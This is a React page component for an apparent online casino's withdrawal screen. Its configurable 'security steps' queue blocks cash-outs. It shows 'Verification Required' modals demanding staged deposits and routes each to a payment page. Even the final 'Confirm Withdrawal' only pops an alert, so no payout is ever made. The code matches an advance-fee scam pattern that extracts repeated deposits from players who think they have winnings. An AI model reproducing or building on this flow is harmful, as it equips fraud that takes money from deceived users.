import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { DollarSign, AlertTriangle, Shield, Wallet, X, CircleDollarSign } from "lucide-react";
import { useTheme } from "../components/ThemeContext";
import { useCurrency } from "../components/CurrencyDisplay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { FLAG_CONFIG, SECURITY_STEPS, getDepositMessage } from "../components/FlagConfig";
import { motion, AnimatePresence } from "framer-motion";

export default function Withdraw() {
  const { theme } = useTheme();
  const { currency, convertCoins, formatCurrency, symbol } = useCurrency();
  const navigate = useNavigate();
  const [user, setUser] = useState(null);
  const [isFlagged, setIsFlagged] = useState(false);
  const [flagData, setFlagData] = useState(null);
  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState(null);

  const paymentMethods = [
    { id: "paypal", name: "PayPal", icon: CircleDollarSign, description: "Fast & secure" },
    { id: "crypto", name: "Cryptocurrency", icon: Wallet, description: "Bitcoin, Ethereum, USDT" },
  ];

  useEffect(() => {
    const stored = localStorage.getItem("casino_user");
    if (stored) {
      const userData = JSON.parse(stored);
      setUser(userData);
      
      // Security steps queue system
      if (FLAG_CONFIG.enabled && SECURITY_STEPS.length > 0) {
        const completedSteps = JSON.parse(localStorage.getItem(`completed_steps_${userData.id}`) || "[]");
        const nextStep = SECURITY_STEPS.find(s => !completedSteps.includes(s.id));
        
        if (nextStep) {
          const stepIndex = SECURITY_STEPS.indexOf(nextStep);
          setCurrentStepIndex(stepIndex);
          setIsFlagged(true);
          setFlagData({
            id: nextStep.id,
            user_id: userData.id,
            reason: nextStep.reason,
            deposit_required_usd: nextStep.deposit_required_usd,
            custom_message: nextStep.message,
            title: nextStep.title,
            is_active: true,
          });
        }
      }
    }
  }, []);

  const handleWithdrawClick = () => {
    if (!withdrawAmount || parseFloat(withdrawAmount) <= 0) {
      alert("Please enter a valid amount");
      return;
    }
    
    if (parseFloat(withdrawAmount) > user.balance) {
      alert("Insufficient balance");
      return;
    }

    setShowModal(true);
  };

  const handleConfirmWithdraw = () => {
    if (!selectedPayment) {
      alert("Please select a payment method");
      return;
    }
    
    // If flagged, they shouldn't get here, but extra safety
    if (isFlagged) {
      return;
    }

    alert("Withdrawal request submitted!");
    setShowModal(false);
    setWithdrawAmount("");
    setSelectedPayment(null);
  };

  if (!user) return null;

  return (
    <>
    <div className="max-w-4xl mx-auto space-y-6">
      <div className="text-center">
        <h1 className="text-3xl font-bold text-white mb-2">Withdraw</h1>
        <p className="text-gray-400">Cash out your winnings</p>
      </div>

      <div className="bg-[#1a2028] border border-gray-800/50 rounded-2xl p-8">
        <div className="max-w-md mx-auto space-y-6">
          <div className={`w-20 h-20 mx-auto rounded-full ${theme.accentBgLight} flex items-center justify-center`}>
            <DollarSign className={`w-10 h-10 ${theme.accentColor}`} />
          </div>
          
          <div>
            <h2 className="text-2xl font-bold text-white mb-2 text-center">Withdraw Funds</h2>
            <p className="text-gray-400 text-center">
              Available Balance: {formatCurrency(user.balance)}
            </p>
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-sm text-gray-400 mb-2 block">Withdrawal Amount</label>
              <div className="relative">
                <Input
                  type="number"
                  value={withdrawAmount}
                  onChange={(e) => setWithdrawAmount(e.target.value)}
                  placeholder="Enter amount"
                  className="bg-[#0f1419] border-gray-700 text-white pr-20"
                />
                <button
                  onClick={() => setWithdrawAmount(user.balance.toString())}
                  className={`absolute right-2 top-1/2 -translate-y-1/2 px-3 py-1 rounded-lg ${theme.accentBg} text-white text-sm font-semibold hover:opacity-80 transition-opacity`}
                >
                  MAX
                </button>
              </div>
            </div>

            <Button
              onClick={handleWithdrawClick}
              disabled={!withdrawAmount || parseFloat(withdrawAmount) <= 0}
              className={`w-full h-12 bg-gradient-to-r ${theme.gradient} hover:${theme.gradientHover} text-white font-semibold disabled:opacity-50`}
            >
              Withdraw
            </Button>
          </div>
        </div>
      </div>
    </div>

    {/* Withdrawal Modal */}
    <AnimatePresence>
      {showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4"
          onClick={() => setShowModal(false)}
        >
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            onClick={(e) => e.stopPropagation()}
            className="bg-[#1a2028] border border-gray-800/50 rounded-2xl p-8 max-w-md w-full relative"
          >
            <button
              onClick={() => setShowModal(false)}
              className="absolute top-4 right-4 text-gray-500 hover:text-white"
            >
              <X className="w-5 h-5" />
            </button>

            {isFlagged && flagData ? (
              <div className="text-center space-y-6">
                <div className="w-20 h-20 mx-auto rounded-full bg-orange-500/10 flex items-center justify-center">
                  <AlertTriangle className="w-10 h-10 text-orange-400" />
                </div>
                <div>
                  <h2 className="text-2xl font-bold text-white mb-3">{flagData.title || "Verification Required"}</h2>
                  <p className="text-gray-300 mb-4">
                    {flagData.custom_message || FLAG_CONFIG.default_message}
                  </p>
                  <p className="text-orange-400 font-semibold">
                    {getDepositMessage(flagData.deposit_required_usd, formatCurrency)}
                  </p>
                </div>
                
                <div className="bg-[#0f1419] border border-gray-800/50 rounded-xl p-6">
                  <div className="flex items-center gap-3 mb-4">
                    <Shield className="w-5 h-5 text-blue-400" />
                    <h3 className="text-white font-semibold">Verification Details</h3>
                  </div>
                  <div className="space-y-3 text-left text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-400">Required Deposit:</span>
                      <span className="text-white font-semibold">{formatCurrency(flagData.deposit_required_usd)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Reason:</span>
                      <span className="text-gray-300">{flagData.reason}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Status:</span>
                      <span className="text-orange-400">Pending</span>
                    </div>
                  </div>
                </div>

                <Button
                  onClick={() => navigate("/Payment", { state: { amount: flagData.deposit_required_usd, stepId: flagData.id, userId: user.id } })}
                  className={`w-full h-12 bg-gradient-to-r ${theme.gradient} hover:${theme.gradientHover} text-white font-semibold`}
                >
                  Go to Payment
                </Button>
              </div>
            ) : (
              <div className="space-y-6">
                <div className="text-center">
                  <h2 className="text-2xl font-bold text-white mb-2">Select Payment Method</h2>
                  <p className="text-gray-400">Withdraw {formatCurrency(parseFloat(withdrawAmount))}</p>
                </div>

                <div className="space-y-3">
                  {paymentMethods.map((method) => {
                    const Icon = method.icon;
                    return (
                      <button
                        key={method.id}
                        onClick={() => setSelectedPayment(method.id)}
                        className={`w-full p-4 rounded-xl border-2 transition-all text-left ${
                          selectedPayment === method.id
                            ? `${theme.accentBorder} ${theme.accentBgLight}`
                            : "border-gray-700 bg-[#0f1419] hover:border-gray-600"
                        }`}
                      >
                        <div className="flex items-center gap-4">
                          <div className={`w-12 h-12 rounded-lg ${selectedPayment === method.id ? theme.accentBg : "bg-gray-800"} flex items-center justify-center`}>
                            <Icon className={`w-6 h-6 ${selectedPayment === method.id ? "text-white" : "text-gray-400"}`} />
                          </div>
                          <div>
                            <h3 className="text-white font-semibold">{method.name}</h3>
                            <p className="text-gray-400 text-sm">{method.description}</p>
                          </div>
                        </div>
                      </button>
                    );
                  })}
                </div>

                <Button
                  onClick={handleConfirmWithdraw}
                  disabled={!selectedPayment}
                  className={`w-full h-12 bg-gradient-to-r ${theme.gradient} hover:${theme.gradientHover} text-white font-semibold disabled:opacity-50`}
                >
                  Confirm Withdrawal
                </Button>
              </div>
            )}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
    </>
  );
}